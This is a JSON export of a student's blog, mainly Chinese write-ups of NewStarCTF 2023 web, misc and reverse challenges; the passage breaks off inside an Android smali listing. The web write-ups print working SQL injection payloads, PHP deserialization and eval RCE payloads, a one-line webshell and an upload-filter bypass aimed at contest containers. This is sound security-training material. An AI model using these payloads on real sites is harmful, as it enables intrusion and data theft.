{"meta":{"title":"lazy_forever's Blog","subtitle":null,"description":"lazy_forever's blog","author":"lazy_forever","url":"https://blog.lazyforever.top","root":"/"},"pages":[{"title":"tags","date":"2023-05-28T17:18:03.000Z","updated":"2023-05-28T17:19:39.687Z","comments":true,"path":"tags/index.html","permalink":"https://blog.lazyforever.top/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-05-28T17:20:02.000Z","updated":"2023-05-28T17:20:28.966Z","comments":true,"path":"categories/index.html","permalink":"https://blog.lazyforever.top/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2023-05-29T09:19:00.000Z","updated":"2023-06-30T07:22:39.305Z","comments":true,"path":"about/index.html","permalink":"https://blog.lazyforever.top/about/index.html","excerpt":"","text":"This is lazy_forever’s blog!Welcome! About MeA student majored in Information Security at Nankai University"},{"title":"link","date":"2023-05-28T17:20:40.000Z","updated":"2023-05-28T17:21:01.421Z","comments":true,"path":"link/index.html","permalink":"https://blog.lazyforever.top/link/index.html","excerpt":"","text":""}],"posts":[{"title":"2023newstarctfWeek2 Web Writeup","slug":"2023newstarctfWeek2","date":"2023-10-09T23:51:20.000Z","updated":"2023-10-17T03:27:11.355Z","comments":true,"path":"2023/10/10/2023newstarctfWeek2/","link":"","permalink":"https://blog.lazyforever.top/2023/10/10/2023newstarctfWeek2/","excerpt":"","text":"解题 6&#x2F;6 游戏高手打开容器，发现一个前端页面，F12进行javascript代码审计。 发现函数gameover() 12345678910111213141516171819202122function gameover()&#123; if(gameScore &gt; 100000)&#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;/api.php&quot;, true); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; var response = JSON.parse(xhr.responseText); alert(response.message); &#125; &#125;; var data = &#123; score: gameScore, &#125;; xhr.send(JSON.stringify(data)); &#125; alert(&quot;成绩：&quot;+gameScore); gameScore=0; curPhase =PHASE_READY; hero = null; hero = new Hero(); &#125; 分析逻辑，发现当gameScore大于100000时，会将&#123;score: gameScore&#125;转化为json发送到&#x2F;api.php，将返回结果alert，因此猜测flag由api.php给出。 在控制台重写gameover函数 1234567891011121314151617181920212223function gameover()&#123; if(gameScore &lt; 100000)&#123; gameScore = 1000000; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, &quot;/api.php&quot;, true); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; var response = JSON.parse(xhr.responseText); alert(response.message); &#125; &#125;; var data = &#123; score: gameScore, &#125;; xhr.send(JSON.stringify(data)); &#125; alert(&quot;成绩：&quot;+gameScore); gameScore=0; curPhase =PHASE_READY; hero = null; hero = new Hero(); &#125; 接着在控制台执行gameover()，得到flag：flag&#123;5d66c0a8-cb52-4099-a3fb-f7d5cf4826d0&#125; include 0。0打开容器，发现一段php 12345678910&lt;?phphighlight_file(__FILE__);// FLAG in the flag.php$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;/base|rot/i&#x27;,$file))&#123; @include($file);&#125;else&#123; die(&quot;nope&quot;);&#125;?&gt; 看到include，文件包含漏洞。 但是!preg_match(&#39;/base|rot/i&#39;,$file)如果file中含有base和rot就会die，所以用不了普通的php://filter/read=convert.base64-encode/resource=flag.php和php://filter/read=string.rot13/resource=flag.php 使用其他字符集，php://filter/read=convert.iconv.UTF8.UTF7/resource=flag.php，得到flag+AHs-59c6afe7-3cad-4eb3-abac-38b09521a184+AH0 稍加改动，得到flag：flag&#123;59c6afe7-3cad-4eb3-abac-38b09521a184&#125; 这里贴一个字符集filter脚本，wupco&#x2F;PHP_INCLUDE_TO_SHELL_CHAR_DICT ez_sql打开容器，发现好多a标签，随便点点，发现有id参数传入。 ?id=TMP0919&#39;--+发现依旧可以显示，猜测是sql注入。 但是?id=TMP0919&#39;or 1=1--+显示no，有黑名单，使用大小写绕过。 ?id=TMP0919&#39;Or 1=1--+绕过成功。 查字段数 1?id=TMP0919&#x27; Order by 5--+ 成功 1?id=TMP0919&#x27; Order by 6--+ 无法回显，得到字段数为5。 1?id=T&#x27; union seLect 1,2,3,4,5--+ 可以正常回显。 查库名 1?id=T&#x27; union seLect database(),2,3,4,5--+ 回显ctf，注意select需要使用大小写绕过。 查表名 1?id=T&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),3,4,5--+ 返回grades,here_is_flag，发现here_is_flag表，注意information_schema和where需要使用大小写绕过。 查列名 1?id=T&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;here_is_flag&#x27; ),4,5--+ 返回flag，得到flag列 查flag 1?id=T&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;here_is_flag&#x27; ),(seLect flag from ctf.here_is_flag),5--+ 得到flag：flag&#123;fbbd976e-4244-4154-b2d1-a38dba8a9ef2&#125; Unserialize？打开容器，发现php代码 12345678910111213141516&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123; private $cmd; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;@unserialize($_POST[&#x27;unser&#x27;]);?&gt; 利用php反序列化漏洞，本地搭建php环境 123456789101112131415161718&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil&#123; private $cmd = &quot;ls /&quot;; public function __destruct() &#123; if (!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd)) &#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil;echo urlencode(serialize($a));?&gt; 拿到O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D 直接打，发现flag路径：/th1s_1s_fffflllll4444aaaggggg 123456789101112131415161718&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil&#123; private $cmd = &quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;; public function __destruct() &#123; if (!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd)) &#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil;echo urlencode(serialize($a));?&gt; 使用单引号绕过过滤，拿到O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A36%3A%22ca%27%27t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D 得到flag：flag&#123;f1e483d0-09a1-4376-b00b-60b3ea9422df&#125; Upload again!上传php，发现有黑名单。 直接上传.htaccess 1AddType application/x-httpd-php .jpg 将jpg解析为php 上传1.jpg，发现含有&lt;?的文件被过滤，使用JavaScript标签绕过。 1&lt;script language=&quot;php&quot;&gt;system($GET[0]);&lt;/script&gt; 可以正常解析，剩下无脑直接找flag即可。 R!!C!!E!!打开容器发现Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information? 信息泄露，猜测是git泄露，使用GitHack工具 得到bo0g1pop.php，内容为 1234567&lt;?phphighlight_file(__FILE__);if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123; if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123; eval($_GET[&#x27;star&#x27;]); &#125;&#125; 分析逻辑，是无参数RCE，从start.sh可以看到flag在/flag中。 首先需要构造出/flag，使用getallheaders函数得到所有http Header 发现User-Agent在第二个，可以使用next(getallheaders())得到值。 改UA为&#x2F;flag，得到/flag字符串，接着使用show_source函数得到flag内容。 完整payload：/bo0g1pop.php?star=show_source(next(getallheaders())); 得到flag：flag&#123;34b4ffdf-5637-46ee-a734-30e031d0b73f&#125; 总结贴一个官方wp：https://shimo.im/docs/Dy5ekHJhKo0ap5v3/ 其他方向没怎么研究，太忙了，只抽出来一个小时写了个Web","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"}]},{"title":"NewStarCTF 2023-WEEK1 WriteUp","slug":"2023newstarctfWeek1","date":"2023-09-26T05:33:13.000Z","updated":"2023-10-02T06:32:39.687Z","comments":true,"path":"2023/09/26/2023newstarctfWeek1/","link":"","permalink":"https://blog.lazyforever.top/2023/09/26/2023newstarctfWeek1/","excerpt":"","text":"好久没碰ctf了，感觉手有点生，正好最近newstar新生赛，过来凑个热闹。 Web解题 7&#x2F;7 泄漏的秘密介绍里面写了“粗心的网站管理员总会泄漏一些敏感信息在Web根目录下”，一眼信息泄露 打开容器，出现粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！，&#x2F;robots.txt一试直接爆出flag的前半段，&#x2F;www.zip直接把源码泄露了。 拿到flag：flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125; Begin of Upload一眼文件上传，写一个php马试一下 1&lt;?php system($_GET[&#x27;cmd&#x27;]); 发现文件后缀有白名单，但是验证是在前端，直接burp抓包改一下文件名就能绕 Begin of HTTP打开容器，发现要求请使用 GET方式 来给 ctf 参数传入任意值来通过这关 加个参数试一下http://node4.buuoj.cn:25055/?ctf=1 发现很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里 ctrl+U看下源码，发现注释&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; base64解码一下，得到secret是n3wst4rCTF2023g00000d HackBar插件传一下POST参数 接下来发现很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关 Cookie改一下power改为ctfer 发现你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！ 把User-Agent改为NewStarCTF2023 发现希望你是从 newstarctf.com 访问到这个关卡的 加个Referer: newstarctf.com 最后发现最后一关了！只有 本地用户 可以通过这一关 加一个Header：X-Real-IP: 127.0.0.1，本来以为这道题是要加X-Forwarded-For，结果加X-Forwarded-For发现好像不太行 拿到flag：flag&#123;221fb558-9c0a-4b07-bac6-3af03cf7393e&#125; ErrorFlask这道题有点奇怪，看到flask以为是SSTI，结果打开容器随便传个number1=&#123;&#123;&#125;&#125;，发现DEBUG模式没关，结果flag直接写到源代码里直接能看见，直接拿到flag：flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125; Begin of PHP上来容器直接给出代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123; echo &quot;=Level 1=&lt;br&gt;&quot;; if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123; $flag1 = True; &#125;else&#123; die(&quot;nope,this is level 1&quot;); &#125;&#125;if($flag1)&#123; echo &quot;=Level 2=&lt;br&gt;&quot;; if(isset($_POST[&#x27;key3&#x27;]))&#123; if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123; $flag2 = True; &#125; &#125;else&#123; die(&quot;nope,this is level 2&quot;); &#125;&#125;if($flag2)&#123; echo &quot;=Level 3=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key4&#x27;]))&#123; if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123; $flag3 = True; &#125;else&#123; die(&quot;nope,this is level 3&quot;); &#125; &#125;&#125;if($flag3)&#123; echo &quot;=Level 4=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key5&#x27;]))&#123; if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123; $flag4 = True; &#125;else&#123; die(&quot;nope,this is level 4&quot;); &#125; &#125;&#125;if($flag4)&#123; echo &quot;=Level 5=&lt;br&gt;&quot;; extract($_POST); foreach($_POST as $var)&#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123; die(&quot;nope,this is level 5&quot;); &#125; &#125; if($flag5)&#123; echo file_get_contents(&quot;/flag&quot;); &#125;else&#123; die(&quot;nope,this is level 5&quot;); &#125;&#125; 先看level1，要保证$_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;] &amp;&amp; md5($_GET[&#39;key1&#39;]) == md5($_GET[&#39;key2&#39;])为 True，发现md5直接的判断是&#x3D;&#x3D;而不是&#x3D;&#x3D;&#x3D;，直接0e碰撞即可，随便找两个240610708和QLTHNDT就行。 再看level2，保证md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]为 True，中间是&#x3D;&#x3D;&#x3D;，没办法再用level1的0e碰撞了，这里一个小技巧直接POST传key3[]=即可，这里key3直接被识别成数组了，导致两个函数都返回false。 接下来level3，保证strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0为 True，继续用key4[]=，用数组的方式让其返回false 然后level4，保证!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023为 True，传key5=2024a，当它与2023比较时就会比它大，而且还识别不出它是数字。 最后level5，要保证它不能全是字母和数字，还要保证flag5变量是True，POST传flag5=-即可。 拿到flag：flag&#123;35c5a11f-c06d-4178-9fb8-b4f97d3e9796&#125; R!C!E!打开容器，贴上代码 1234567891011&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123; $password=md5($_POST[&#x27;password&#x27;]); $code=$_POST[&#x27;e_v.a.l&#x27;]; if(substr($password,0,6)===&quot;c4d038&quot;)&#123; if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123; eval($code); &#125; &#125;&#125; 要保证password的md5前6位是c4d038，同时code中不能含有一些敏感的单词。 这里贴上我跑MD5的脚本，写的不好，但是勉强能跑 123456789101112131415161718192021222324252627282930313233343536373839import hashlibimport itertoolsimport stringimport threading# 需要遍历的字符集characters = string.digits + string.ascii_lettersdef generate_combinations(length): for combo in itertools.product(characters, repeat=length): yield &#x27;&#x27;.join(combo)def calculate_md5(string): md5_hash = hashlib.md5() # 创建MD5对象 md5_hash.update(string.encode()) # 更新对象哈希值 md5_digest = md5_hash.hexdigest() # 获取哈希值的十六进制表示 return md5_digestdef find_md5_match(prefix): for combo in generate_combinations(len(prefix)): string = prefix + combo md5 = calculate_md5(string) if md5[0:6] == &#x27;c4d038&#x27;: print(f&quot;&#123;string&#125; MD5哈希值: &#123;md5&#125;&quot;)# 测试计算MD5input_string = &quot;0&quot;threads = []for i in range(6): # 根据实际情况设置线程数量 prefix = input_string * i thread = threading.Thread(target=find_md5_match, args=(prefix,)) threads.append(thread) thread.start()for thread in threads: thread.join()print(f&quot;&#123;input_string&#125;dddMD5哈希值: &#123;md5&#125;&quot;) 随便跑出来一个0000006sNj 接着直接传 1e[v.a.l=echo `cat /f*` 这里注意要用[代替_，这算是一个php特性。 EasyLogin打开容器，看到一个登录注册页面，拿burp抓包，最开始以为是sql注入，但是注入发现提示不是注入。 随便注册一个账号admin1，登录后发现是一个静态的shell，javascript代码审计一下，发现 1&quot;echo -en &#x27;\\\\nnewstar\\\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\\\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\\\\nrm -rf weak-passwd.txt&quot;),applyAutoComplete(le),await sleep(800),term.writeln(WELCOME_TEXT),readInput(),le.detach(),await sleep(200),le.attach(),le.pushInput(&quot;chat&quot;),le.confirm(),await sleep(200),le.pushInput(&quot;你会说中文吗？&quot;) 提示weak-passwd.txt弱口令，再加上注册时发现admin用户已经被注册，使用burp直接爆破密码。 发现admin弱口令是000000 登录，并拦截返回包，javascript审计，发现提示 1&quot;echo Maybe you need BurpSuite.&quot; 清除cookie重新登录，拦截passport的返回包，得到flag：flag&#123;97222ac1-f6d3-49c1-b1e6-05778420cfe2&#125; Misc解题 5&#x2F;6 CyberChef’s Secret签到题，打开后看到M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=，进入cyberchef.org，一把梭，拿到flag：flag&#123;Base_15_S0_Easy_^_^&#125;。 机密图片zsteg工具 执行zsteg secret.png得到 123456b1,r,lsb,xy .. text: &quot;:=z^rzwPQb&quot;b1,g,lsb,xy .. file: OpenPGP Public Keyb1,b,lsb,xy .. file: OpenPGP Secret Keyb1,rgb,lsb,xy .. text: &quot;flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;&quot;b3,b,lsb,xy .. file: very old 16-bit-int big-endian archiveb4,bgr,msb,xy .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo 拿到flag：flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125; 流量！鲨鱼！wireshark打开发现流量1.php%3fcmd=ls%20-al%20内容为 123456789101112131415161718192021222324total 80drwxr-xr-x 1 root root 4096 Aug 19 06:17 .drwxr-xr-x 1 root root 4096 Aug 19 06:17 ..-rwxr-xr-x 1 root root 0 Aug 19 06:08 .dockerenv-rw-r--r-- 1 root root 39 Aug 19 06:17 .ffffllllllll11111144444GGGGGGdrwxr-xr-x 1 root root 4096 Dec 21 2021 bindrwxr-xr-x 2 root root 4096 Dec 11 2021 bootdrwxr-xr-x 5 root root 360 Aug 19 06:08 devdrwxr-xr-x 1 root root 4096 Aug 19 06:08 etcdrwxr-xr-x 2 root root 4096 Dec 11 2021 homedrwxr-xr-x 1 root root 4096 Dec 21 2021 libdrwxr-xr-x 2 root root 4096 Dec 20 2021 lib64drwxr-xr-x 2 root root 4096 Dec 20 2021 mediadrwxr-xr-x 2 root root 4096 Dec 20 2021 mntdrwxr-xr-x 2 root root 4096 Dec 20 2021 optdr-xr-xr-x 248 root root 0 Aug 19 06:08 procdrwx------ 1 root root 4096 Aug 19 06:17 rootdrwxr-xr-x 1 root root 4096 Dec 21 2021 rundrwxr-xr-x 1 root root 4096 Dec 21 2021 sbindrwxr-xr-x 2 root root 4096 Dec 20 2021 srvdr-xr-xr-x 13 root root 0 Aug 19 06:08 sysdrwxrwxrwt 1 root root 4096 Dec 21 2021 tmpdrwxr-xr-x 1 root root 4096 Dec 20 2021 usrdrwxr-xr-x 1 root root 4096 Dec 21 2021 var 发现啊flag名字.ffffllllllll11111144444GGGGGG 启动过滤器frame contains ffffllllllll11111144444GGGGGG，追踪HTTP流，看到flag的两次base64编码：Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=，base64解密两次得到：flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125; 压缩包们下载后发现打不开 使用binwalk，binwalk -e task_1 ，得到一个压缩包，bandizip打开发现base64编码的注释SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==，base64解密后得到I like six-digit numbers because they are very concise and easy to remember.，拿爆破工具直接爆破密码，得到232311，拿到flag：flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125; 空白格下载后发现都是空格、Tab和换行，联想到WhiteSpace语言，在网上随便找一个WhiteSpace在线运行环境whitespace在线运行,在线工具，在线编译IDE_w3cschool，运行得到flag：flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125; Reverse解题 7&#x2F;8 easy_RE下载程序，拖到ida里面打开，能看见flag的前半部分flag&#123;we1c0m F5反编译，看到后半部分e_to_rev3rse!!&#125;，得到完整flag：flag&#123;we1c0me_to_rev3rse!!&#125; 咳Upx脱壳upx -d KE.exe 反编译代码 1234567891011121314151617181920212223242526int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned __int64 i; // r10 char *v4; // kr00_8 char Str1[96]; // [rsp+20h] [rbp-88h] BYREF int v7; // [rsp+80h] [rbp-28h] _main(); memset(Str1, 0, sizeof(Str1)); v7 = 0; Hello(); scanf(&quot;%s&quot;, Str1); for ( i = 0i64; ; ++i ) &#123; v4 = &amp;Str1[strlen(Str1)]; if ( i &gt;= v4 - Str1 ) break; ++Str1[i]; &#125; if ( !strncmp(Str1, enc, v4 - Str1) ) puts(&quot;WOW!!&quot;); else puts(&quot;I believe you can do it!&quot;); system(&quot;pause&quot;); return 0;&#125; 其中enc是gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~， 写一个python脚本解密 123a=&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;for i in a: print(chr(ord(i)-1),end=&#x27;&#x27;) 得到flag：flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125; Segments下载附件，拖到ida里，提示shift+F7，直接按，发现段名字中藏着flag flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125; ELF反编译，得到c代码： 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // edx char *s1; // [rsp+0h] [rbp-20h] char *v6; // [rsp+8h] [rbp-18h] char *s; // [rsp+10h] [rbp-10h] s = (char *)malloc(0x64uLL); printf(&quot;Input flag: &quot;); fgets(s, 100, stdin); s[strcspn(s, &quot;\\n&quot;)] = 0; v6 = (char *)encode(s); v3 = strlen(v6); s1 = (char *)base64_encode(v6, v3); if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) ) puts(&quot;Correct&quot;); else puts(&quot;Wrong&quot;); free(v6); free(s1); free(s); return 0;&#125; 发现base64，对字符串进行解密 得到V\\QWkt $_e&#39;^_ggXQ&#39;u|v!c/m 分析encode函数： 12345678910111213141516171819_BYTE *__fastcall encode(const char *a1)&#123; size_t v1; // rax int v2; // eax _BYTE *v4; // [rsp+20h] [rbp-20h] int i; // [rsp+28h] [rbp-18h] int v6; // [rsp+2Ch] [rbp-14h] v1 = strlen(a1); v4 = malloc(2 * v1 + 1); v6 = 0; for ( i = 0; i &lt; strlen(a1); ++i ) &#123; v2 = v6++; v4[v2] = (a1[i] ^ 0x20) + 16; &#125; v4[v6] = 0; return v4;&#125; 写出python解密脚本 12345a=&#x27;V\\QWkt $_e\\&#x27;^_ggXQ\\&#x27;u|v!c/m&#x27;b=&#x27;&#x27;for i in a: b+=chr((ord(i)-16)^0x20)print(b) 得到flag：flag&#123;D04ou7nowwha7ELF1s?&#125; Endian反编译，得到： 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // [rsp+4h] [rbp-3Ch] char *v5; // [rsp+8h] [rbp-38h] char v6[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); puts(&quot;please input your flag&quot;); __isoc99_scanf(&quot;%s&quot;, v6); v5 = v6; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) ) &#123; printf(&quot;wrong!&quot;); exit(0); &#125; v5 += 4; &#125; printf(&quot;you are right&quot;); return 0;&#125; 其中array为dd 75553A1Eh, 7B583A03h, 4D58220Ch, 7B50383Dh, 736B3819h, 0，shift+e提取数组元素，写出python脚本 123456789101112arrr=[ 1968519710, 2069379587, 1297621516, 2068854845, 1936406553, 0 ]for i in arrr: h=((i^0x12345678)) value = h nums = [] while value &gt; 0: nums.append(hex(value &amp; 0xFF)) # 取出低位部分，并转换为16进制字符串 value &gt;&gt;= 8 # 右移8位，获取下一个位置的部分 nums_str = [chr(int(num,16)) for num in nums] result_str = &#x27;&#x27;.join(nums_str) print(result_str,end=&#x27;&#x27;) 执行拿到flag：flag&#123;llittl_Endian_axV4 修改一下得到最后flag：flag&#123;llittl_Endian_a&#125; AndroXorAndroid killer打开，java反编译，入口处com.chick.androxor.MainActivity得到关键函数： 1234567891011121314151617181920212223public String Xor(String paramString1, String paramString2) &#123; char[] arrayOfChar = new char[paramString1.length()]; int i = paramString1.length(); String str1 = &quot;wrong!!!&quot;; String str2; if (i != 25) &#123; str2 = &quot;wrong!!!&quot;; &#125; else &#123; str2 = &quot;you win!!!&quot;; &#125; for (i = 0; i &lt; paramString1.length(); i++) &#123; int j = (char)(paramString1.charAt(i) ^ paramString2.charAt(i % paramString2.length())); arrayOfChar[i] = ((char)j); if (new char[] &#123; 14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13 &#125;[i] != j) &#123; str2 = str1; break; &#125; &#125; return str2; &#125; 在com.chick.androxor.MainActivity$1类中得到key为happyx3 1234567public void onClick(View paramView) &#123; String str = this.val$password.getText().toString(); paramView = this.this$0; Toast.makeText(paramView, paramView.Xor(str, &quot;happyx3&quot;), 1).show(); Log.d(&quot;输入&quot;, this.val$password.getText().toString()); &#125; 编写python脚本 12345678key = &quot;happyx3&quot;cipher = [14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13]result = &quot;&quot;for i in range(len(cipher)): result += chr(cipher[i] ^ ord(key[i % len(key)]))print(result) 得到flag：flag&#123;3z_And0r1d_X0r_x1x1&#125; lazy_activtiy安装apk后打开发现要求我们打开另一个Activity来获得flag 查看apk配置文件AndroidManifest.xml 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:compileSdkVersion=&quot;32&quot; android:compileSdkVersionCodename=&quot;12&quot; package=&quot;com.droidlearn.activity_travel&quot; platformBuildVersionCode=&quot;32&quot; platformBuildVersionName=&quot;12&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Activity_Travel&quot;&gt; &lt;activity android:exported=&quot;false&quot; android:name=&quot;com.droidlearn.activity_travel.FlagActivity&quot;/&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.droidlearn.activity_travel.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 将入口处改为FlagActivity，并且把FlagActivity的exported改为true 改后xml文件如下 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:compileSdkVersion=&quot;32&quot; android:compileSdkVersionCodename=&quot;12&quot; package=&quot;com.droidlearn.activity_travel&quot; platformBuildVersionCode=&quot;32&quot; platformBuildVersionName=&quot;12&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Activity_Travel&quot;&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.droidlearn.activity_travel.FlagActivity&quot;/&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.droidlearn.activity_travel.MainActivity&quot;&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 重新编译后打开，发现要求点击按钮10000次才能获得flag。 分析smali语句 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899.class Lcom/droidlearn/activity_travel/FlagActivity$1;.super Ljava/lang/Object;.source &quot;FlagActivity.java&quot;# interfaces.implements Landroid/view/View$OnClickListener;# annotations.annotation system Ldalvik/annotation/EnclosingMethod; value = Lcom/droidlearn/activity_travel/FlagActivity;-&gt;onCreate(Landroid/os/Bundle;)V.end 